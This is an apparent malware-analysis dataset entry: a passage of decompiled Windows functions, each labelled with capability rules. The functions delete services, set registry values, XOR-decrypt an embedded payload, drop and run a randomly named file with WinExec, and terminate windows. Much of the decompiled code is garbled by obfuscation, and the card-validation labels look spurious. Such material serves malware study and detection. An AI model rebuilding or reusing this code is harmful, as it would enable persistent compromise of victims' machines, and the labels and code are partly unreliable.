fcn.00403fc0(param_7, param_8, 0x4231d0, 7);\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    if (puStack8 == NULL) {\n        return 0;\n    }\n    uStack40 = 0;\n    puVar10 = &uStack40 + 1;\n    for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    uVar9 = 0;\n    do {\n        uVar2 = (*pcVar1)();\n        (&uStack40)[uVar9] = uVar2;\n        uVar9 = uVar9 + 1;\n    } while (uVar9 < 0x20);\n    puVar10 = &uStack40;\n    puVar11 = puStack8;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar11 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    bVar12 = (POPCOUNT(puVar11 - 1U & 0xff) & 1U) == 0;\n    cVar3 = fcn.004027d0(param_3, param_4, param_5, param_6, &uStack40, 0x20, puStack8);\n    if ((bVar12) || (iVar5 = extraout_ECX,  uVar7 = extraout_EDX,  !bVar12)) {\n        iVar5 = param_8;\n        uVar7 = param_7;\n        in_stack_ffffffa8 = param_7;\n    }\n    iVar8 = *0x8b17b43a;\n    *(iVar5 + 0x52) = (*(iVar5 + 0x52) - cVar3) - (uVar7 + 1U < 0x8b);\n    fcn.004038c0(iVar8 + -1, in_stack_ffffffa8);\n    return 1;\n}\n",
        "token_count": 899
    },
    "00404090": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404090(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42363c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004019c0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x423460, acStack1304, &uStack2112);\n    uStack2088 = 0x4234e8;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x423500;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00403ca0(auStack1564, 0x42345c, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1867
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar4 = fcn.00401960(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.004016e0(argv),  pcVar3 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar3)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 258
    },
    "004010a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401105) overlaps instruction at (ram,0x00401101)\n// \n\nuint __cdecl fcn.004010a0(int32_t **arg_8h, int32_t arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint8_t extraout_DL;\n    char *pcVar3;\n    int32_t *piVar4;\n    uint unaff_EBX;\n    int32_t *unaff_ESI;\n    int32_t **unaff_EDI;\n    bool in_CF;\n    char in_ZF;\n    char cVar5;\n    bool bVar6;\n    char cVar7;\n    unkbyte10 extraout_ST0;\n    ulong uVar8;\n    uint uVar9;\n    uint in_stack_ffffffec;\n    \n    if ((in_CF) || (!in_CF)) {\n        in_stack_ffffffec = 0;\n    }\n    else {\n        in_ECX = in_ECX + -1;\n        if (in_ECX != 0 && in_ZF != '\\0') {\n            return 0;\n        }\n    }\n    iVar2 = *unaff_ESI;\n    *unaff_EDI = unaff_ESI + 1;\n    pcVar3 = iVar2 >> 0x1f;\n    *unaff_EDI = *unaff_EDI + in_ECX;\n    cVar5 = in_ECX >> 8;\n    bVar6 = SCARRY1(*pcVar3, cVar5);\n    *pcVar3 = *pcVar3 + cVar5;\n    uVar9 = 0;\n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    if ((bVar6) || (!bVar6)) {\n        unaff_EDI = arg_8h;\n    }\n    puVar1 = unaff_EDI + 0x56;\n    cVar7 = '\\0';\n    *puVar1 = *puVar1 | extraout_DL;\n    cVar5 = *puVar1 < '\\0';\n    uVar8 = fcn.00401740(uVar9, in_stack_ffffffec);\n    piVar4 = uVar8 >> 0x20;\n    if ((cVar7 != cVar5) || (iVar2 = uVar8,  cVar7 == cVar5)) {\n        iVar2 = arg_ch;\n    }\n    *(iVar2 + -0x7ce92414) = extraout_ST0;\n    *piVar4 = *piVar4 + 0x458bdf84;\n    uVar9 = fcn.00404430(arg_8h_00, unaff_EDI, unaff_EBX);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar9;\n}\n",
        "token_count": 640
    },
    "00401130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401130(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.00404620(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 105
    },
    "00401350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00401350(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pvData;\n    \n    pvData = NULL;\n    iVar2 = fcn.00404da0(&pvData);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (pvData == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = pvData;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x423354, 0x423394, 1, pvData, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 233
    },
    "00401490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401490(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "004014e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain pusha popa sequence"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401523) overlaps instruction at (ram,0x0040151f)\n// \n// WARNING: Removing unreachable block (ram,0x004015b3)\n\nvoid __cdecl fcn.004014e0(uchar *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t *in_EDX;\n    int32_t unaff_EBX;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint32_t unaff_ESI;\n    uchar *puVar6;\n    bool bVar7;\n    uint auStack24 [2];\n    \n    puVar3 = &stack0xfffffffc;\n    *arg_8h = 200;\n    if ((in_EDX < (unaff_ESI | 0x561b)) && ((unaff_ESI | 0x561b) <= in_EDX)) {\n        *in_EDX = arg_8h + *in_EDX;\n    }\n    else {\n        arg_8h[1] = 0x32;\n    }\n    arg_8h[2] = 1;\n    arg_8h[3] = 0xdf;\n    bVar7 = unaff_EBX == -1;\n    arg_8h[4] = 0x15;\n    puVar6 = arg_8h;\n    if ((!bVar7) && (bVar7)) {\n        puVar6 = arg_8h + 1;\n        out(*arg_8h, in_EDX);\n    }\n    puVar6[5] = 0xee;\n    puVar5 = &stack0xfffffffc;\n    if ((!bVar7) && (puVar5 = &stack0xfffffffc,  bVar7)) {\n        puVar4 = auStack24 + 1;\n        puVar5 = auStack24 + 1;\n        cVar2 = '\\x10';\n        do {\n            puVar3 = puVar3 + -1;\n            puVar4 = puVar4 + -1;\n            *puVar4 = *puVar3;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    puVar6[6] = 0x21;\n    iVar1 = *(puVar5 + 8);\n    *(iVar1 + 7) = 0xc1;\n    *(iVar1 + 8) = 0xe8;\n    *(iVar1 + 9) = 0x4b;\n    iVar1 = *(puVar5 + 8);\n    *(iVar1 + 10) = 0xcb;\n    *(iVar1 + 0xb) = 0xbe;\n    **(puVar5 + 0xc) = 0xc;\n    return;\n}\n",
        "token_count": 632
    },
    "00401740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040178d)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401740(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 141
    },
    "004017d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004017ef)\n// WARNING: Removing unreachable block (ram,0x004017f5)\n\nvoid __cdecl fcn.004017d0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401860(&var_68h, &var_4h);\n    fcn.00403d50(&var_68h, var_4h, 0x411174, 0x12000);\n    *arg_8h = 0x411174;\n    *arg_ch = 0x12000;\n    return;\n}\n",
        "token_count": 270
    },
    "004019c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004019e9) overlaps instruction at (ram,0x004019e8)\n// \n\nvoid __cdecl fcn.004019c0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t in_DL;\n    int32_t unaff_EBX;\n    uint32_t unaff_ESI;\n    uint32_t unaff_EDI;\n    bool in_OF;\n    \n    if (((!in_OF) && (in_OF)) || (unaff_ESI = 0,  unaff_EBX = arg_8h,  unaff_EDI = arg_ch,  arg_ch != 0)) {\n        do {\n            *0x7d8b5d73 = *0x7d8b5d73 | in_DL;\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            in_DL = iVar1 % 0x1a + 0x61;\n            *(unaff_ESI + unaff_EBX) = in_DL;\n            unaff_ESI = unaff_ESI + 1;\n        } while (unaff_ESI < unaff_EDI);\n    }\n    return;\n}\n",
        "token_count": 265
    },
    "00402960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402960(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "00403080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403080(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x423550);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x403000, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 361
    },
    "004031a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040336e) overlaps instruction at (ram,0x0040336a)\n// \n// WARNING: Removing unreachable block (ram,0x00403261)\n// WARNING: Removing unreachable block (ram,0x0040326f)\n// WARNING: Removing unreachable block (ram,0x00403271)\n\nvoid fcn.004031a0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uchar uVar7;\n    uchar uVar8;\n    uchar uStack612;\n    uint uStack611;\n    uchar uStack352;\n    uint uStack351;\n    uint auStack92 [11];\n    uint uStack48;\n    ushort uStack44;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    fcn.00402370();\n    iVar2 = fcn.00402990();\n    if (iVar2 != 0) {\n        uStack612 = 0;\n        puVar5 = &uStack611;\n        for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        *puVar5 = 0;\n        *(puVar5 + 2) = 0;\n        iVar2 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &uStack612, 0x26, 0);\n        if (iVar2 != 0) {\n            if ((iVar2 < 0) || (iVar4 = extraout_ECX,  iVar2 >= 0)) {\n                fcn.00404890();\n                iVar4 = 0x40;\n            }\n            *(iVar4 + 0x40) = *(iVar4 + 0x40);\n            uStack352 = 0;\n            puVar5 = &uStack351;\n            for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&uStack352, 0x423528, &uStack612, 0x423508, 3);\n            puVar5 = _sym.imp.KERNEL32.dll_Sleep;\n            iStack24 = 0;\n            do {\n                puVar6 = auStack92;\n                for (iVar2 = 0x11; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                uStack20 = 0;\n                auStack92[0] = 0x44;\n                uStack16 = 0;\n                uStack48 = 1;\n                uStack12 = 0;\n                uStack44 = 0;\n                uStack8 = 0;\n                iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &uStack352, 0, 0, 0, 0, 0, 0, auStack92, &uStack20);\n                if (iVar2 == 0) {\n                    return;\n                }\n                (*puVar5)(3000);\n                (*_sym.imp.USER32.dll_EnumWindows)(fcn.00403080);\n                uVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uStack20, 1000);\n                uVar7 = uVar3 < 0x102;\n                uVar8 = uVar3 == 0x102;\n                if (uVar8) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack20, 1);\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                if ((!uVar7 && !uVar8) && (uVar7 || uVar8)) {\n                    *puVar6 = *puVar5;\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack16);\n                (*pcVar1)(uStack20);\n                iStack24 = iStack24 + 1;\n            } while (iStack24 < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1039
    },
    "004038c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004038c0(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t extraout_DL;\n    uint32_t uVar2;\n    unkuint3 unaff_EDI;\n    \n    uVar2 = arg_ch;\n    iVar1 = fcn.004011e0();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = arg_ch;\n    if ((0x51 < extraout_DL) && (extraout_DL < 0x52)) {\n        uVar2 = unaff_EDI;\n    }\n    fcn.004011e0(arg_8h, uVar2, 4, &arg_ch);\n    return 1;\n}\n",
        "token_count": 173
    },
    "00403a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403a6d) overlaps instruction at (ram,0x00403a6c)\n// \n// WARNING: Removing unreachable block (ram,0x00403a6d)\n\nvoid __cdecl fcn.00403a20(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t extraout_CL;\n    uint8_t extraout_CH;\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uchar *puVar3;\n    uint *unaff_EDI;\n    char cVar4;\n    char cVar5;\n    ulong uVar6;\n    \n    uVar2 = *0x10 - 4;\n    puVar3 = &stack0xfffffffc;\n    if (arg_ch == 1) {\n        fcn.00401a30();\n        uVar1 = CONCAT22(*0x10 + -0x10, uVar2);\n        cVar5 = '\\0';\n        cVar4 = (extraout_CH | 0x47) < '\\0';\n        puVar3 = &stack0xfffffffc & 0xffff0000 | uVar2;\n        uVar6 = fcn.00404490();\n        if ((cVar5 == cVar4) && (cVar5 != cVar4)) {\n            out(0xc4, uVar6);\n            uVar1 = uVar6 >> 0x20 & 0xffffff00 | uVar6 >> 0x20 ^ extraout_CL;\n            *unaff_EDI = uVar6;\n        }\n        fcn.004031a0(uVar1);\n        if (*0x423638 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00404090();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(*(puVar3 + 8), *(puVar3 + 0xc), *(puVar3 + 0x10), *(puVar3 + 0x14));\n    return;\n}\n",
        "token_count": 457
    },
    "00403d50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403d50(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (arg_14h != 0) {\n        do {\n            *(var_8h + arg_10h) = *(var_8h + arg_10h) ^ *(var_8h % arg_ch + arg_8h);\n            var_8h = var_8h + 1;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00403fc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404016) overlaps instruction at (ram,0x00404015)\n// \n// WARNING: Removing unreachable block (ram,0x00404006)\n// WARNING: Removing unreachable block (ram,0x00404081)\n// WARNING: Removing unreachable block (ram,0x004040a2)\n// WARNING: Removing unreachable block (ram,0x004040ac)\n// WARNING: Removing unreachable block (ram,0x004040d3)\n// WARNING: Removing unreachable block (ram,0x004040d5)\n// WARNING: Removing unreachable block (ram,0x004040ed)\n// WARNING: Removing unreachable block (ram,0x004040ef)\n// WARNING: Removing unreachable block (ram,0x00404107)\n// WARNING: Removing unreachable block (ram,0x00404109)\n// WARNING: Removing unreachable block (ram,0x0040418a)\n// WARNING: Removing unreachable block (ram,0x00404197)\n// WARNING: Removing unreachable block (ram,0x00404199)\n// WARNING: Removing unreachable block (ram,0x004041a9)\n// WARNING: Removing unreachable block (ram,0x004041ab)\n// WARNING: Removing unreachable block (ram,0x004041b8)\n// WARNING: Removing unreachable block (ram,0x004041ba)\n// WARNING: Removing unreachable block (ram,0x004041c0)\n// WARNING: Removing unreachable block (ram,0x004041c2)\n// WARNING: Removing unreachable block (ram,0x004041c8)\n// WARNING: Removing unreachable block (ram,0x004041ca)\n// WARNING: Removing unreachable block (ram,0x004041cc)\n// WARNING: Removing unreachable block (ram,0x0040420b)\n// WARNING: Removing unreachable block (ram,0x0040420d)\n// WARNING: Removing unreachable block (ram,0x00404220)\n// WARNING: Removing unreachable block (ram,0x00404222)\n// WARNING: Removing unreachable block (ram,0x0040422f)\n// WARNING: Removing unreachable block (ram,0x00404231)\n// WARNING: Removing unreachable block (ram,0x00404237)\n// WARNING: Removing unreachable block (ram,0x00404239)\n// WARNING: Removing unreachable block (ram,0x0040423e)\n// WARNING: Removing unreachable block (ram,0x00404240)\n// WARNING: Removing unreachable block (ram,0x0040424a)\n// WARNING: Removing unreachable block (ram,0x0040424c)\n// WARNING: Removing unreachable block (ram,0x00404274)\n// WARNING: Removing unreachable block (ram,0x0040427c)\n\nchar * fcn.00403fc0(char *param_1, int32_t param_2, char *param_3, int32_t param_4)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    bool bVar6;\n    \n    pcVar1 = param_1 + (param_2 - param_4);\n    if (param_4 != 0) {\n        pcVar3 = param_1 & 0xffff0000 | CONCAT11(*pcVar1, param_1);\n        if (param_1 <= pcVar1) {\n            do {\n                if (*pcVar3 == *param_3) {\n                    bVar6 = true;\n                    iVar2 = param_4;\n                    pcVar4 = pcVar3;\n                    pcVar5 = param_3;\n                    do {\n                        pcVar5 = pcVar5 + 1;\n                        pcVar4 = pcVar4 + 1;\n                        iVar2 = iVar2 + -1;\n                        if (iVar2 == 0) break;\n                        bVar6 = *pcVar4 == *pcVar5;\n                    } while (bVar6);\n                    if (bVar6) {\n                        return pcVar3;\n                    }\n                }\n                pcVar3 = pcVar3 + 1;\n            } while (pcVar3 <= 